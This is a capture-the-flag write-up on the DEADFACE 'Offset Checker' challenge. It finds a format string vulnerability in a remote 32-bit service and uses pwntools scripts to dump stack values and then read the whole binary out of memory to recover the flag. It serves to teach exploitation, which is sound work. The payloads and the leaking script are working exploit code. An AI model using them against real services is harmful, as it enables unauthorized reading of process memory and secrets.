# Offset Checker

### Or Leaking a Binary Through a Format String

The description for this challenge is as follows:

*DEADFACE is running a service to allow their members to check the offset to EIP when exploiting a buffer overflow. There is also a secret key somewhere in memory.*

*Retrieve the secret from memory from the remote service, running on: offsetcheck.deadface.io:31337*

*The flag will be in format: flag{.*}.*

This was worth 300 points in the CTF, and it had a total of 10 solves, which was low for this CTF. Basically, it is a black box challenge, so it requires some creativity to find the vulnerability and get the flag. I ended up leaking the whole code section out through a format string vulnerability I found and finding the flag in there, but there could be a better way.

## Gathering Information:

Since this is a black-box challenge, our only option is to try inputs against the remote service and see what works. The basic functionality of the service looks like this:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ nc offsetcheck.deadface.io 31337
Please enter the string (max 200 char) sent to the buffer:
aaaaaaaaaaa
Please enter what showed up in EIP:
aa
Searching buffer:
aaaaaaaaaa...
Substring found at position 0
Please enter the string (max 200 char) sent to the buffer:
```
I generated a string of 250 a's and tried feeding that in, but it looks like input is being received without causing an overflow, and my extra input is simply being received by additional reads or similar.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ nc offsetcheck.deadface.io 31337
Please enter the string (max 200 char) sent to the buffer:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Please enter what showed up in EIP:
Searching buffer:
aaaaaaaaaa...
Substring found at position 0
Please enter the string (max 200 char) sent to the buffer:
Please enter what showed up in EIP:
```
This pretty much just leaves a format string vulnerability for things I could be reasonably expected to find in this scenario; fortunately, it worked.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ nc offsetcheck.deadface.io 31337
Please enter the string (max 200 char) sent to the buffer:
%p%p%p%p
Please enter what showed up in EIP:
%p
Searching buffer:
0x5(nil)0x...
Substring not found
Please enter the string (max 200 char) sent to the buffer:
```
Somehow, the output that I can see is limited to 10 characters.

The next step is to see where my format string starts intersecting with my input, as well as get a good view of the stack just in case the flag is stored there somewhere based on the prompt. I made a looping pwntools script to view the first 80 addresses on the stack:
```
from pwn import *
import string

target = remote('offsetcheck.deadface.io', 31337)

for i in range(1, 80):
    print(target.recvuntil(b'sent to the buffer:'))
    payload = b'%' + str(i).encode('ascii') + b'$p'   
    print(payload)
    payload += b'a' * (100 - len(payload))
    target.sendline(payload)

    (target.recvuntil(b'Please enter what showed up in EIP:'))
    target.sendline(b'b')

target.interactive()
```
Some of the highlights included an address leaked at index 4 that is 4 bytes long, indicating that this is a 32-bit binary:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ python3 offset_checker_stack_scan.py
[+] Opening connection to offsetcheck.deadface.io on port 31337: Done
b'Please enter the string (max 200 char) sent to the buffer:'
b'%1$p'
b'\n\x00Searching buffer:\n\x000x5aaaaaaa\x00...\n\x00\x00\x00\x00\x00Substring found at position 0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Please enter the string (max 200 char) sent to the buffer:'
b'%2$p'
b'\n\x00Searching buffer:\n\x00b\n\x00\x00\x00\x00\x00\x00\x00\x00\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%3$p'
b'\n\x00Searching buffer:\n\x00aaaaaaaaaa\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%4$p'
b'\n\x00Searching buffer:\n\x000xff972821\x00...\n\x00\x00\x00\x00\x00Substring found at position 0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Please enter the string (max 200 char) sent to the buffer:'
```
And at an index of 29, it looks like it starts printing my input back at me in intervals of four bytes of hex; this will allow me to input my own address and use %s to read from that address, or %n to write to that address. 
```
b'%29$p'
b'\n\x00Searching buffer:\n\x000x24393225\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%30$p'
b'\n\x00Searching buffer:\n\x000x61616170\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%31$p'
b'\n\x00Searching buffer:\n\x000x61616161\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%32$p'
b'\n\x00Searching buffer:\n\x000x61616161\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
b'%33$p'
b'\n\x00Searching buffer:\n\x000x61616161\x00...\n\x00\x00\x00\x00\x00Substring not found\nPlease enter the string (max 200 char) sent to the buffer:'
```
## Leaking the Binary:

So, I examined all of my stack leaks, as well as trying %s with some of the addresses on the stack, and failed to find a flag. As a result, I decided to go for leaking the whole binary for further examination; this will be missing sections and difficult to decompile, but it will certainly be better than nothing!

Here is a simple payload to show how to print a specific address, which would be placed in lieu of the four capital A's.
```
payload = b'%' + str(34).encode('ascii') + b'$p'
payload += b'b' * (20 - len(payload))
payload += b'A' * 4
```
If you send this in, the four 0x41's printed by the format string are the A's.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ python3 offset_checker_sample_leak.py
[+] Opening connection to offsetcheck.deadface.io on port 31337: Done
b'Please enter the string (max 200 char) sent to the buffer:'
b'%34$pbbbbbbbbbbbbbbbAAAA'
b'\n\x00Please enter what showed up in EIP:'
[*] Switching to interactive mode

\x00Searching buffer:
\x000x41414141\x00..
\x00\x00\x00ubstring not found
Please enter the string (max 200 char) sent to the buffer:
\x00$
```
Now, if we check a 32-bit binary we already have (exploitchecker_old2 will do nicely!), we can see that, if we assume that there is no PIE, the code section should start at 0x08048000 with '\x7fELF'.
![image](https://user-images.githubusercontent.com/10614967/196196922-897834d3-33d0-41d4-8e73-30ab5085c3b8.png)

 We can test that out with some edits to the format string payload:
 ```
payload = b'%' + str(34).encode('ascii') + b'$s'
payload += b'b' * (20 - len(payload))
payload += p32(0x08048000)
 ```
 Which produces an output of:
 ```
 knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/deadfaceCTF22$ python3 offset_checker_sample_leak.py
[+] Opening connection to offsetcheck.deadface.io on port 31337: Done
b'Please enter the string (max 200 char) sent to the buffer:'
b'%34$sbbbbbbbbbbbbbbb\x00\x80\x04\x08'
b'\n\x00Please enter what showed up in EIP:'
[*] Switching to interactive mode

\x00Searching buffer:
\x00\x7fELFbbb\x00..
\x00\x00\x00ubstring not found
 ```
 Cool! What we can do now is leak the entire binary out in a similar manner. Since the leak only gives us the first 10 characters, it is a little bit more complicated than usual to determine when the string actually terminates due to the presence of a null in the binary, and when it has simply run out of available characters. After a lot of troubleshooting, I came up with the following script:
 ```
 from pwn import *

target = remote('offsetcheck.deadface.io', 31337)


file1 = open('leaked_elf', 'ab')
base = 0x8048000
#base = 0x804a000 #Use this one when leaking the GOT

while True:
    (target.recvuntil(b'sent to the buffer:'))
    payload = b'%' + str(34).encode('ascii') + b'$s' + b'zbcdefghij'
    payload += b'b' * (20 - len(payload))
    payload += p32(base)
    #print(my_input)
    target.sendline(payload)

    (target.recvuntil(b'Please enter what showed up in EIP:'))
    target.sendline(b'a')
    (target.recvuntil(b'Searching buffer:'))
    (target.recvuntil(b'\x00'))
    leak = target.recvuntil(b'...')
    print(leak)
    leak = leak.replace(b'...', b'').replace(b'zbcdefghij\x00', b'').replace(b'zbcdefghi\x00', b'').replace(b'zbcdefgh\x00', b'').replace(b'zbcdefg\x00', b'').replace(b'zbcdef\x00', b'').replace(b'zbcde\x00', b'').replace(b'zbcd\x00', b'').replace(b'zbc\x00', b'').replace(b'zb\x00', b'').replace(b'z\x00', b'')
    #print(leak[-1])
    if len(leak) > 1 and leak[-1] == 0:
        leak = leak[:-1]
        base -= 1
    if len(leak) != 10:    
        base += len(leak) + 1
        print(leak)
        print(hex(base))
        file1.write(leak + b'\x00')
    else:
        base += len(leak) + 1
        print(leak)
        print(hex(base))
        file1.write(leak)

target.interactive()
```
I ended up running it twice; once with a base address of 0x8048000, and once with a base address of 0x804a000 (0x8049000-0x804a000 turned out to be unallocated memory). The second run would get the GOT/global variable section, and if you copy-pasted the results of both together, it would actually decompile in Ghidra relatively neatly. The main meat of the program is shown below.
![image](https://user-images.githubusercontent.com/10614967/196199471-84a53d3c-d75d-46eb-aa66-0b534189f11e.png)

Here, it appears that some sort of string is being loaded into a stack variable. If we copy-paste all of these hex values and convert them to text, we get a flag!
```
>>> from pwn import *
>>> p32(0x67616c66) + p32(0x3373757b) + p32(0x342d612d) + p32(0x2d74406d) + p32(0x31527453) + p32(0x412d476e) + p32(0x622d644e) + p32(0x33745552) + p32(0x63723066) + p16(0x7d33)
b'flag{us3-a-4m@t-StR1nG-ANd-bRUt3f0rc3}'
```
Thanks for reading!
